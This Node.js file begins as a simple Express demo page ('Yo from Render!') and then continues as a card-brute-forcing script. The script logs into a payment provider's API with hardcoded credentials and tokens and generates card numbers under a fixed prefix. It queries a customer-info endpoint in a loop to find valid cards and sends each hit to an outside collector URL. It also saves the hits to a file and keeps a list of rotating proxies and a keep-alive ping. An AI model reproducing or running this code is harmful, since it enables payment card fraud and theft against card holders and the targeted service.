const express = require("express");
const app = express();
const port = process.env.PORT || 3001;

app.get("/", (req, res) => res.type('html').send(html));

app.listen(port, () => console.log(`Example app listening on port ${port}!`));
var i = 0;
const html = `
<!DOCTYPE html>
<html>
  <head>
    <title>Yo from Render!</title>
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
    <script>
      setTimeout(() => {
        confetti({
          particleCount: 100,
          spread: 70,
          origin: { y: 0.6 },
          disableForReducedMotion: true
        });
      }, 500);
    </script>
    <style>
      @import url("https://p.typekit.net/p.css?s=1&k=vnd5zic&ht=tk&f=39475.39476.39477.39478.39479.39480.39481.39482&a=18673890&app=typekit&e=css");
      @font-face {
        font-family: "neo-sans";
        src: url("https://use.typekit.net/af/00ac0a/00000000000000003b9b2033/27/l?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&v=3") format("woff2"), url("https://use.typekit.net/af/00ac0a/00000000000000003b9b2033/27/d?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&v=3") format("woff"), url("https://use.typekit.net/af/00ac0a/00000000000000003b9b2033/27/a?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&v=3") format("opentype");
        font-style: normal;
        font-weight: 700;
      }
      html {
        font-family: neo-sans;
        font-weight: 700;
        font-size: calc(62rem / 16);
      }
      body {
        background: white;
      }
      section {
        border-radius: 1em;
        padding: 1em;
        position: absolute;
        top: 50%;
        left: 50%;
        margin-right: -50%;
        transform: translate(-50%, -50%);
      }
    </style>
  </head>
  <body>
    <section>
      Yo from Render!
    </section>
  </body>
</html>
`
const fs = require('fs');
const HttpsProxyAgent = require('https-proxy-agent');
var proxies = ["31.186.239.245:8080",    "200.105.215.22:33630",    "49.0.2.242:8090",    "198.49.68.80:80",    "212.107.28.122:80",    "169.57.1.85:8123",    "41.175.26.113:80",    "190.61.88.147:8080",    "167.172.158.85:81",    "185.147.35.240:80",    "31.186.239.246:8080",    "139.99.237.62:80",    "185.191.76.84:80",    "209.182.239.62:80",    "154.26.134.214:80",    "20.111.54.16:80",  "221.132.28.18:8090", "110.164.3.7:8888",    "216.137.184.253:80",   "104.148.36.10:80",    "31.186.239.244:8080",    "161.35.223.141:80",    "45.79.110.81:80",    "64.227.23.88:8118",    "51.75.141.46:80",    "161.97.126.37:8118",  "102.130.192.231:8080",    "198.59.191.234:8080",    "87.247.186.105:80",    "34.71.115.148:80",    "72.170.220.17:8080",    "173.212.195.139:80",    "195.158.3.103:8080","45.152.188.248:3128"];


var cookie = require('cookie');


  var num = "0118883434";
const fetch = require('node-fetch');
login = { userIdentifier: num,password:num,fireBaseToken:"diehJic_R7qwLo0wDm71k1:APA91bHsL-ye5a69TZ94Pd6e2wRW_KcXlbXWawyyFbsGudgfv4mQ-8kbJnNllyLzm9_rbdHxUJngaspTtpQQqtgr8N1M8HGzYWAjeZQrtwn2dlINzrjJLtrVO6z_jrHTYyXrs_7mxefO"};
/*
var reader = readline.createInterface({
  input: fs.createReadStream('col.txt')
  });
reader.on('line', function (card) {});
*/
//var timer = setInterval(function(){},500)
  //var card = "7222081370019771304";
  function fish(){
var card = "6391750"+rand(9);
//Math.random().toString().slice(2,11);
var random = Math.floor(Math.random()*proxies.length);
    var proxy = proxies[random];
//var proxyAgent = new HttpsProxyAgent('http://'+proxy);
fetch('https://syberapp.sybertechnology.com/api/login',{
  method: 'POST',
  body:JSON.stringify(login),
  headers: {
    'content-type': 'application/json',
    'Authorization':'xwrsy67Un9oshl8H=c5g',
    'Version':'100',
    'User-Agent':'okhttp/4.9.1',
  },
  //agent: proxyAgent
}).then((response) =>{ 
  var status = response.status;
  if(status == 200){
    
var token = response.headers.get('set-cookie');
cookies = cookie.parse(token);
      var re = cookies["HttpOnly, remember-me-posc"];
var id = gen(8)+"-"+gen(4)+"-"+gen(4)+"-"+gen(4)+"-"+gen(12);
fetch('https://syberapp.sybertechnology.com/customerInfo',{
  method: 'POST',
  body:JSON.stringify(
    {"transactionId":id,"serviceId":"000009001016","pan":card,"lat":"0.0","lng":"0.0","authType":"10"}
    ),
  headers: {
    // 'application/json' is the modern content-type for JSON, but some
    // older servers may use 'text/json'.
    // See: http://bit.ly/text-json
    'content-type': 'application/json',
    'Authorization':'xwrsy67Un9oshl8H=c5g',
    'Version':'100',
    'User-Agent':'okhttp/4.9.1',
   'Cookie':"remember-me-posc="+re
  },
  //agent: proxyAgent
}).then(response=>response.json()).then(data=>{
  if(data.errorCode){
    //console.log("Error "+card + " "+data.errorCode);
    fish();
  }else if(data.responseStatus){
 fetch('https://renoche.000webhostapp.com/collector/accounts.php', {
    method: 'POST',

    headers: {
        'Content-Type': 'application/json; charset=utf-8',
        'User-Agent': 'okhttp/4.9.1',
        'Version': '100',
        'Accept-Encoding': 'gzip',
      
    },
    body: JSON.stringify(
{"id":card}
)
})
    console.log("Success "+ card)
fs.appendFile("live.txt",card+"\n",function (err) {if (err) throw err;

fish();
});

  }
}).catch((error)=>{
  if(error.code == 'ECONNREFUSED'){
  console.log("Proxy Refused V2 "+proxy)
fish()
  }
})

  }else if(status == 403){
console.log("Forbidden "+proxy)
fish()
}else if(status == 500){
//console.log("System Error "+proxy)
fish()
}else{
console.log("Account Locked "+status+" "+proxy)
}
}).catch((error)=>{
  if(error.code == 'ECONNREFUSED'){
  console.log("Proxy Refused " +proxy)
go()
  }
})


}
fish();
function gen(length) {
    var result           = '';
    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for ( var i = 0; i < length; i++ ) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}
function rand(length) {
    var result           = '';
    var characters       = '0123456789';
    var charactersLength = characters.length;
    for ( var i = 0; i < length; i++ ) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

setInterval(()=>{
fetch("https://ren-carder.glitch.me/")
},240000)
